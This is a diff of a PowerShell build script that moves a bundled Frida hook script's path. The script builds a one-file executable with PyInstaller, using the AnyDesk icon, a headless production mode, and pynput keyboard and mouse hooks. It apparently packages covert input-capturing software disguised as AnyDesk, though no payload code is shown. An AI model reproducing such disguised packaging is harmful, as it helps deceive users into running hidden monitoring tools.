@@ -72,7 +72,7 @@ Write-Host ""
 if ($Dev) {
     Write-Host "Building DEV mode with console"
     Write-Host ""
-    & $venvPython -m PyInstaller --onefile --console --name $ExeBaseName --icon assets/AnyDesk.ico --add-data "utils/frida_hook.js;utils" --add-data "assets;assets" --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 main.py
+    & $venvPython -m PyInstaller --onefile --console --name $ExeBaseName --icon assets/AnyDesk.ico --add-data "utils/scripts/frida_hook.js;utils/scripts" --add-data "assets;assets" --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 main.py
     
     if ($LASTEXITCODE -ne 0) {
         Write-Host ""
@@ -100,7 +100,7 @@ if ($Dev) {
 } else {
     Write-Host "Building PRODUCTION mode headless"
     Write-Host ""
-    & $venvPython -m PyInstaller --onefile --noconsole --name $ExeBaseName --icon assets/AnyDesk.ico --add-data "utils/frida_hook.js;utils" --add-data "assets;assets" --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 main.py
+    & $venvPython -m PyInstaller --onefile --noconsole --name $ExeBaseName --icon assets/AnyDesk.ico --add-data "utils/scripts/frida_hook.js;utils/scripts" --add-data "assets;assets" --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 main.py
     
     if ($LASTEXITCODE -ne 0) {
         Write-Host ""
